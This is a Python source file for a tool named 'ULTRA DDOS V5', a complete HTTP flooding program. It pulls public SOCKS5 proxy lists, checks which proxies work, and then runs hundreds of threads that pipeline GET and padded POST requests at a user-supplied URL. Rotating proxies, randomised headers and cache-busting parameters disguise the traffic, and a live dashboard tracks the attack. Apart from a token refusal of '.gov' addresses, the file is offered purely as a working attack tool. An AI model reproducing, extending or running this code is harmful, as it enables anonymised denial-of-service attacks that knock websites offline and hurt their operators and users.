#!/usr/bin/python -tt
# =====================================================
# ULTRA DDOS V5 FINAL - CLEAN & HONEST
# Coded by DQV - NO HIDDEN LOGGING, NO FALSE METRICS
# =====================================================
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import urllib.parse
import hashlib
from collections import deque
from colorama import Fore, Back, Style, init
from typing import Optional, Tuple, List

init(autoreset=True)

print(f'''{Fore.RED}
                 __                      _____
                / /  __ _ _   _  ___ _ _|___  |
               / /  / _` | | | |/ _ \ '__| / /
              / /__| (_| | |_| |  __/ |   / /
              \____/\__,_|\__, |\___|_|  /_/
                           |___/
- - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ ULTRA DDOS V5 FINAL - CLEAN & HONEST
~~~ No hidden logging, Real metrics only
~~~ Multi-proxy rotation + Smart error handling
- - - - - - - - - - - - - - - - - - - - - - - - - - - -{Style.RESET_ALL}''')

# =====================================================
# REALISTIC BYPASS HEADERS - NO FALSE CLAIMS
# =====================================================
# NOTE: These headers increase request visibility variation.
# They do NOT guarantee bypass of modern WAF/CDN.
# Modern WAF validates header patterns and detects spoofed headers.
SMART_HEADERS = {
    # Browser-like GET headers
    "browser_get": [
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("Accept-Encoding", "gzip, deflate"),
        ("DNT", "1"),
        ("Upgrade-Insecure-Requests", "1"),
    ],
    # Mobile user agent simulation
    "mobile_get": [
        ("Accept", "text/html,application/xhtml+xml,*/*;q=0.9"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("Accept-Encoding", "gzip, deflate"),
        ("Sec-Fetch-Dest", "document"),
        ("Sec-Fetch-Mode", "navigate"),
        ("Sec-Fetch-Site", "none"),
    ],
    # Cache bypass (legitimate headers)
    "cache_bypass": [
        ("Cache-Control", "no-cache, no-store, must-revalidate"),
        ("Pragma", "no-cache"),
        ("Expires", "0"),
    ],
    # POST form headers
    "form_post": [
        ("Accept", "application/json, text/plain, */*"),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("X-Requested-With", "XMLHttpRequest"),
    ],
}

# =====================================================
# PROXY MANAGER - WITH REAL HEALTH CHECK
# =====================================================
class ProxyManager:
    def __init__(self, proxies: List[str]):
        self.proxies = deque(proxies)
        self.dead_proxies = set()
        self.lock = threading.RLock()
        self.health_stats = {}
        self.working_proxies = []
        
    def get_next(self) -> Optional[Tuple[str, int, int]]:
        """Get next proxy (ip, port, socks_type)"""
        with self.lock:
            if not self.proxies:
                return None
            
            for _ in range(len(self.proxies)):
                proxy_str = self.proxies.popleft()
                self.proxies.append(proxy_str)
                
                if proxy_str in self.dead_proxies:
                    continue
                
                try:
                    parts = proxy_str.strip().split(':')
                    if len(parts) >= 2:
                        ip = parts[0]
                        port = int(parts[1])
                        socks_type = int(parts[2]) if len(parts) > 2 else 5
                        return ip, port, socks_type
                except:
                    continue
            
            return None
    
    def mark_success(self, proxy: str):
        """Mark proxy as working"""
        with self.lock:
            if proxy in self.dead_proxies:
                self.dead_proxies.remove(proxy)
            
            if proxy not in self.health_stats:
                self.health_stats[proxy] = {'success': 0, 'fail': 0}
            self.health_stats[proxy]['success'] += 1
    
    def mark_dead(self, proxy: str):
        """Mark proxy as dead after failures"""
        with self.lock:
            if proxy not in self.health_stats:
                self.health_stats[proxy] = {'success': 0, 'fail': 0}
            
            self.health_stats[proxy]['fail'] += 1
            
            if self.health_stats[proxy]['fail'] >= 3:
                self.dead_proxies.add(proxy)
    
    def health_check_all(self, target: str, port: int):
        """Check ALL proxies before attack"""
        print(f"\n{Fore.CYAN}[*] Running health check on proxies...{Fore.RESET}\n")
        
        working = []
        dead = []
        
        for proxy_str in list(self.proxies):
            try:
                parts = proxy_str.strip().split(':')
                if len(parts) < 2:
                    continue
                
                ip = parts[0]
                proxy_port = int(parts[1])
                socks_type = int(parts[2]) if len(parts) > 2 else 5
                
                # Try to connect
                s = socks.socksocket()
                s.set_proxy(
                    socks.SOCKS5 if socks_type == 5 else socks.SOCKS4,
                    ip,
                    proxy_port
                )
                s.settimeout(2)
                
                try:
                    s.connect((target, port))
                    s.close()
                    working.append(proxy_str)
                    self.working_proxies.append(proxy_str)
                    print(f"{Fore.LIGHTGREEN_EX}[✓] {proxy_str}{Fore.RESET}")
                except:
                    dead.append(proxy_str)
                    self.dead_proxies.add(proxy_str)
                    print(f"{Fore.LIGHTRED_EX}[✗] {proxy_str}{Fore.RESET}")
                
            except Exception as e:
                dead.append(proxy_str)
                print(f"{Fore.LIGHTRED_EX}[✗] {proxy_str} - {e}{Fore.RESET}")
        
        print(f"\n{Fore.LIGHTGREEN_EX}[+] Working proxies: {len(working)}/{len(self.proxies)}{Fore.RESET}")
        
        if len(working) < 5:
            print(f"{Fore.LIGHTYELLOW_EX}[!] Warning: Only {len(working)} working proxies. Attack may be slow.{Fore.RESET}\n")
        
        return len(working) > 0

proxy_manager = None

# =====================================================
# STATS - HONEST METRICS ONLY
# =====================================================
class HonestStats:
    def __init__(self):
        self.start_time = time.time()
        self.requests_sent = 0
        self.bytes_sent = 0
        self.lock = threading.RLock()
        self.peak_rps = 0
        
        # Real response codes
        self.status_2xx = 0
        self.status_3xx = 0
        self.status_4xx = 0
        self.status_5xx = 0
        self.status_429 = 0
        self.status_403 = 0
        
        # Honest error tracking
        self.connection_failed = 0
        self.timeout_failed = 0
        self.parse_failed = 0  # Couldn't read response
    
    def add_request_success(self, bytes_sent: int, status_code: int):
        """Record VERIFIED successful request"""
        with self.lock:
            self.requests_sent += 1
            self.bytes_sent += bytes_sent
            
            if 200 <= status_code < 300:
                self.status_2xx += 1
            elif 300 <= status_code < 400:
                self.status_3xx += 1
            elif status_code == 429:
                self.status_429 += 1
            elif status_code == 403:
                self.status_403 += 1
            elif 400 <= status_code < 500:
                self.status_4xx += 1
            elif 500 <= status_code < 600:
                self.status_5xx += 1
    
    def add_connection_failed(self):
        """Request failed to connect"""
        with self.lock:
            self.requests_sent += 1
            self.connection_failed += 1
    
    def add_timeout_failed(self):
        """Request timed out - NOT counted as success"""
        with self.lock:
            self.requests_sent += 1
            self.timeout_failed += 1
    
    def add_parse_failed(self):
        """Couldn't parse response - NOT counted as success"""
        with self.lock:
            self.requests_sent += 1
            self.parse_failed += 1
    
    def get_stats(self) -> dict:
        elapsed = max(time.time() - self.start_time, 0.1)
        rps = self.requests_sent / elapsed
        self.peak_rps = max(self.peak_rps, rps)
        mbps = (self.bytes_sent / elapsed) / (1024 * 1024)
        
        # HONEST success rate: only 2xx + 3xx responses
        total_responses = self.status_2xx + self.status_3xx + self.status_4xx + self.status_5xx + self.status_429 + self.status_403
        success_rate = (self.status_2xx + self.status_3xx) / max(total_responses, 1) * 100 if total_responses > 0 else 0
        
        with self.lock:
            return {
                'requests': self.requests_sent,
                'bytes': self.bytes_sent,
                'elapsed': elapsed,
                'rps': rps,
                'mbps': mbps,
                'peak_rps': self.peak_rps,
                'success_rate': success_rate,
                '2xx': self.status_2xx,
                '3xx': self.status_3xx,
                '4xx': self.status_4xx,
                '429': self.status_429,
                '403': self.status_403,
                '5xx': self.status_5xx,
                'connection_failed': self.connection_failed,
                'timeout_failed': self.timeout_failed,
                'parse_failed': self.parse_failed,
            }

stats = HonestStats()

# =====================================================
# HTTP REQUEST BUILDER
# =====================================================
class RequestBuilder:
    def __init__(self, target: str, port: int, protocol: str = "http"):
        self.target = target
        self.port = port
        self.protocol = protocol
    
    def build_get(self, path: str = "/", extra_headers: dict = None) -> str:
        """Build GET request"""
        if extra_headers is None:
            extra_headers = {}
        
        headers = {
            "Host": self.target,
            "User-Agent": self._random_ua(),
            "Connection": "keep-alive",
        }
        headers.update(extra_headers)
        
        header_str = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        return f"GET {path} HTTP/1.1\r\n{header_str}\r\n\r\n"
    
    def build_post(self, path: str = "/", data: str = "", extra_headers: dict = None) -> str:
        """Build POST request"""
        if extra_headers is None:
            extra_headers = {}
        
        if not data:
            data = f"id={random.randint(1000,9999)}&data={'X'*5000}"
        
        headers = {
            "Host": self.target,
            "User-Agent": self._random_ua(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data)),
            "Connection": "keep-alive",
        }
        headers.update(extra_headers)
        
        header_str = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        return f"POST {path} HTTP/1.1\r\n{header_str}\r\n\r\n{data}"
    
    @staticmethod
    def _random_ua() -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15",
        ]
        return random.choice(agents)

# =====================================================
# RESPONSE PARSER - STRICT
# =====================================================
class ResponseParser:
    @staticmethod
    def parse_status_code(response_data: bytes) -> Optional[int]:
        """Extract HTTP status code - return None if can't parse"""
        try:
            response_str = response_data.decode('utf-8', errors='ignore')
            lines = response_str.split('\r\n')
            
            if lines and lines[0].startswith('HTTP'):
                parts = lines[0].split()
                if len(parts) >= 2:
                    return int(parts[1])
            
            return None
        except:
            return None

# =====================================================
# ATTACK METHODS - CLEAN
# =====================================================
def cannon_clean(event: threading.Event, ind_rlock: threading.RLock):
    """CANNON - Multi-vector attack with honest metrics"""
    if not proxy_manager:
        return
    
    event.wait()
    add_param = "?" if "?" not in path else "&"
    
    while True:
        try:
            proxy_info = proxy_manager.get_next()
            if not proxy_info:
                stats.add_connection_failed()
                time.sleep(0.2)
                continue
            
            proxy_ip, proxy_port, proxy_socks_type = proxy_info
            proxy_str = f"{proxy_ip}:{proxy_port}"
            
            # Connect
            s = socks.socksocket()
            s.set_proxy(
                socks.SOCKS5 if proxy_socks_type == 5 else socks.SOCKS4,
                proxy_ip,
                proxy_port
            )
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            
            try:
                s.connect((target, port))
            except socket.timeout:
                stats.add_timeout_failed()
                s.close()
                proxy_manager.mark_dead(proxy_str)
                continue
            except:
                stats.add_connection_failed()
                s.close()
                proxy_manager.mark_dead(proxy_str)
                continue
            
            # SSL for HTTPS
            if protocol == "https":
                try:
                    ctx = ssl.SSLContext()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                except:
                    stats.add_connection_failed()
                    s.close()
                    continue
            
            builder = RequestBuilder(target, port, protocol)
            
            # Send 150 requests per connection
            for n in range(150):
                try:
                    # Rotate header sets
                    header_type = random.choice(list(SMART_HEADERS.keys()))
                    extra_headers = dict(random.sample(SMART_HEADERS[header_type], 
                                                       min(2, len(SMART_HEADERS[header_type]))))
                    
                    # Alternate methods
                    method = n % 3
                    if method == 0:
                        req = builder.build_get(f"{path}{add_param}r={random.random()}", extra_headers)
                    else:
                        payload = f"data={'X'*5000}"
                        req = builder.build_post(path, payload, extra_headers)
                    
                    # Send
                    try:
                        sent = s.send(req.encode('utf-8', errors='ignore'))
                    except:
                        stats.add_connection_failed()
                        break
                    
                    if not sent:
                        break
                    
                    # Try to read response (ONLY count if we get status code)
                    s.settimeout(0.3)
                    try:
                        response = s.recv(4096)
                        status_code = ResponseParser.parse_status_code(response)
                        
                        if status_code is not None:
                            stats.add_request_success(sent, status_code)
                        else:
                            # Couldn't parse = not counting as success
                            stats.add_parse_failed()
                    
                    except socket.timeout:
                        # Timeout = not success (we don't know if it was processed)
                        stats.add_timeout_failed()
                    except:
                        stats.add_parse_failed()
                    
                    s.settimeout(3)
                
                except Exception as e:
                    break
            
            s.close()
            proxy_manager.mark_success(proxy_str)
        
        except Exception as e:
            stats.add_connection_failed()

def turbo_clean(event: threading.Event, ind_rlock: threading.RLock):
    """TURBO - Fast GET-only attack"""
    if not proxy_manager:
        return
    
    event.wait()
    add_param = "?" if "?" not in path else "&"
    
    while True:
        try:
            proxy_info = proxy_manager.get_next()
            if not proxy_info:
                stats.add_connection_failed()
                continue
            
            proxy_ip, proxy_port, proxy_socks_type = proxy_info
            proxy_str = f"{proxy_ip}:{proxy_port}"
            
            s = socks.socksocket()
            s.set_proxy(
                socks.SOCKS5 if proxy_socks_type == 5 else socks.SOCKS4,
                proxy_ip,
                proxy_port
            )
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            
            try:
                s.connect((target, port))
            except:
                stats.add_connection_failed()
                s.close()
                proxy_manager.mark_dead(proxy_str)
                continue
            
            if protocol == "https":
                try:
                    ctx = ssl.SSLContext()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                except:
                    s.close()
                    continue
            
            builder = RequestBuilder(target, port, protocol)
            
            # High frequency GET
            for n in range(400):
                try:
                    extra_headers = dict(random.sample(SMART_HEADERS["browser_get"], 2))
                    req = builder.build_get(f"{path}{add_param}t={time.time()}", extra_headers)
                    
                    sent = s.send(req.encode('utf-8', errors='ignore'))
                    if not sent:
                        break
                    
                    s.settimeout(0.1)
                    try:
                        response = s.recv(2048)
                        status_code = ResponseParser.parse_status_code(response)
                        if status_code:
                            stats.add_request_success(sent, status_code)
                        else:
                            stats.add_parse_failed()
                    except socket.timeout:
                        stats.add_timeout_failed()
                    except:
                        stats.add_parse_failed()
                    
                    s.settimeout(3)
                except:
                    break
            
            s.close()
            proxy_manager.mark_success(proxy_str)
        
        except Exception as e:
            stats.add_connection_failed()

# =====================================================
# UI
# =====================================================
def output_to_screen(ind_rlock: threading.RLock):
    """Display honest statistics"""
    sp_chars = ["|", "/", "-", "\\"]
    i = 0
    
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"\n{Fore.LIGHTRED_EX}{'╔' + '═'*70 + '╗':^75}")
            print(f"{'║' + 'ULTRA DDOS V5 - CLEAN & HONEST'.center(70) + '║':^75}")
            print(f"{'╚' + '═'*70 + '╝':^75}{Fore.RESET}\n")
            
            stat = stats.get_stats()
            
            print(f"{Fore.CYAN}📊 REAL-TIME STATISTICS:{Fore.RESET}")
            print(f"  Total Requests: {Fore.LIGHTYELLOW_EX}{stat['requests']:,}{Fore.RESET}")
            print(f"  Current RPS: {Fore.LIGHTGREEN_EX}{stat['rps']:,.0f}{Fore.RESET}")
            print(f"  Peak RPS: {Fore.LIGHTRED_EX}{stat['peak_rps']:,.0f}{Fore.RESET}")
            print(f"  Data Sent: {Fore.LIGHTYELLOW_EX}{stat['mbps']:.2f} MB/s{Fore.RESET}\n")
            
            print(f"{Fore.GREEN}📈 HTTP RESPONSES (Verified only):{Fore.RESET}")
            print(f"  2xx (Success): {Fore.LIGHTGREEN_EX}{stat['2xx']:,}{Fore.RESET}")
            print(f"  3xx (Redirect): {Fore.LIGHTBLUE_EX}{stat['3xx']:,}{Fore.RESET}")
            print(f"  4xx (Error): {Fore.LIGHTYELLOW_EX}{stat['4xx']:,}{Fore.RESET}")
            print(f"  429 (Rate Limit): {Fore.LIGHTRED_EX}{stat['429']:,}{Fore.RESET}")
            print(f"  403 (Forbidden): {Fore.RED}{stat['403']:,}{Fore.RESET}")
            print(f"  5xx (Server Error): {Fore.LIGHTMAGENTA_EX}{stat['5xx']:,}{Fore.RESET}\n")
            
            print(f"{Fore.YELLOW}❌ UNVERIFIED (Not counted as success):{Fore.RESET}")
            print(f"  Timeouts: {Fore.LIGHTYELLOW_EX}{stat['timeout_failed']:,}{Fore.RESET}")
            print(f"  Parse Failed: {Fore.LIGHTYELLOW_EX}{stat['parse_failed']:,}{Fore.RESET}")
            print(f"  Connection Failed: {Fore.LIGHTRED_EX}{stat['connection_failed']:,}{Fore.RESET}\n")
            
            print(f"{Fore.CYAN}✓ HONEST Success Rate: {Fore.LIGHTGREEN_EX}{stat['success_rate']:.1f}%{Fore.RESET}")
            print(f"  (Only 2xx + 3xx responses, NOT including timeouts)\n")
            
            print(f"{Fore.LIGHTRED_EX}{sp_chars[i]:^75}")
            print(f"{'🔥 ATTACK IN PROGRESS 🔥':^75}{Fore.RESET}\n")
            
            i = (i + 1) % 4
            time.sleep(2)
        
        except KeyboardInterrupt:
            break
        except:
            pass

def download_proxies():
    """Download SOCKS5 proxies"""
    print(f"\n{Fore.CYAN}[*] Downloading SOCKS5 proxies...{Fore.RESET}\n")
    
    sources = [
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    ]
    
    proxies = set()
    for idx, source in enumerate(sources, 1):
        try:
            print(f"{Fore.CYAN}[{idx}/{len(sources)}] Downloading...{Fore.RESET}")
            response = requests.get(source, timeout=5)
            
            if response.status_code == 200:
                for line in response.text.split('\n'):
                    line = line.strip()
                    if line and ':' in line:
                        proxies.add(line + ":5")
            
            print(f"{Fore.LIGHTGREEN_EX}[+] Source OK{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] Error: {str(e)[:40]}{Fore.RESET}")
    
    proxies = list(proxies)
    print(f"\n{Fore.LIGHTGREEN_EX}[+] Downloaded: {len(proxies)} proxies{Fore.RESET}\n")
    
    return proxies

def main():
    global target, port, protocol, path, proxy_manager
    
    # Download proxies
    proxies = download_proxies()
    
    if not proxies:
        print(f"{Fore.LIGHTRED_EX}[!] No proxies! Exiting.{Fore.RESET}")
        return
    
    proxy_manager = ProxyManager(proxies)
    
    # Input target
    url_input = input(f"{Fore.CYAN}[?] Target URL: {Fore.RESET}").strip()
    
    if '.gov' in url_input.lower():
        print(f"{Fore.LIGHTRED_EX}[!] Cannot attack .gov sites!{Fore.RESET}")
        return
    
    # Parse URL
    if url_input.startswith("https://"):
        protocol = "https"
        url_input = url_input[8:]
        port = 443
    elif url_input.startswith("http://"):
        protocol = "http"
        url_input = url_input[7:]
        port = 80
    else:
        protocol = "http"
        port = 80
    
    parts = url_input.split('/')
    target = parts[0]
    path = '/' + '/'.join(parts[1:]) if len(parts) > 1 else '/'
    
    if ':' in target:
        target, port_str = target.rsplit(':', 1)
        try:
            port = int(port_str)
        except:
            pass
    
    # Choose method
    method = input(f"{Fore.CYAN}[?] Method (cannon/turbo, default=cannon): {Fore.RESET}").strip() or "cannon"
    if method not in ["cannon", "turbo"]:
        method = "cannon"
    
    # Threads
    thread_input = input(f"{Fore.CYAN}[?] Threads (default=500): {Fore.RESET}").strip()
    thread_num = int(thread_input) if thread_input.isdigit() else 500
    
    # RUN HEALTH CHECK FIRST
    if not proxy_manager.health_check_all(target, port):
        print(f"{Fore.LIGHTRED_EX}[!] No working proxies found!{Fore.RESET}")
        return
    
    print(f"\n{Fore.LIGHTGREEN_EX}{'='*75}")
    print(f"{'ATTACK CONFIGURATION':^75}")
    print(f"{'='*75}")
    print(f"Method: {Fore.LIGHTYELLOW_EX}{method}{Fore.RESET}")
    print(f"Target: {Fore.LIGHTYELLOW_EX}{target}:{port}{Fore.RESET}")
    print(f"Protocol: {Fore.LIGHTYELLOW_EX}{protocol.upper()}{Fore.RESET}")
    print(f"Threads: {Fore.LIGHTYELLOW_EX}{thread_num}{Fore.RESET}")
    print(f"Working Proxies: {Fore.LIGHTYELLOW_EX}{len(proxy_manager.working_proxies)}{Fore.RESET}")
    print(f"Metrics: {Fore.LIGHTYELLOW_EX}HONEST (No false timeouts){Fore.RESET}")
    print(f"{Fore.LIGHTGREEN_EX}{'='*75}{Fore.RESET}\n")
    
    # Start threads
    attack_func = cannon_clean if method == "cannon" else turbo_clean
    
    print(f"{Fore.LIGHTCYAN_EX}[*] Starting {thread_num} threads...{Fore.RESET}")
    event = threading.Event()
    ind_rlock = threading.RLock()
    
    for _ in range(thread_num):
        th = threading.Thread(target=attack_func, args=(event, ind_rlock), daemon=True)
        th.start()
    
    input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start attack...{Fore.RESET}")
    event.set()
    
    print(f"\n{Fore.LIGHTRED_EX}{'🔥 ATTACK STARTED 🔥':^75}{Fore.RESET}\n")
    
    # Display stats
    stats_thread = threading.Thread(target=output_to_screen, args=(ind_rlock,), daemon=True)
    stats_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stat = stats.get_stats()
        print(f"\n\n{Fore.LIGHTYELLOW_EX}{'='*75}")
        print(f"{'ATTACK STOPPED':^75}")
        print(f"{'='*75}")
        print(f"Total Requests Sent: {stat['requests']:,}")
        print(f"Peak RPS: {stat['peak_rps']:,.0f}")
        print(f"Data Sent: {stat['mbps']:.2f} MB/s")
        print(f"\nVERIFIED responses:")
        print(f"  2xx: {stat['2xx']:,} | 3xx: {stat['3xx']:,} | 4xx: {stat['4xx']:,}")
        print(f"  429: {stat['429']:,} | 403: {stat['403']:,} | 5xx: {stat['5xx']:,}")
        print(f"\nUnverified (not counted):")
        print(f"  Timeouts: {stat['timeout_failed']:,}")
        print(f"  Parse Failed: {stat['parse_failed']:,}")
        print(f"  Connection Failed: {stat['connection_failed']:,}")
        print(f"\n✓ HONEST Success Rate: {stat['success_rate']:.1f}%")
        print(f"{'='*75}{Fore.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[!] Fatal Error: {e}{Fore.RESET}")
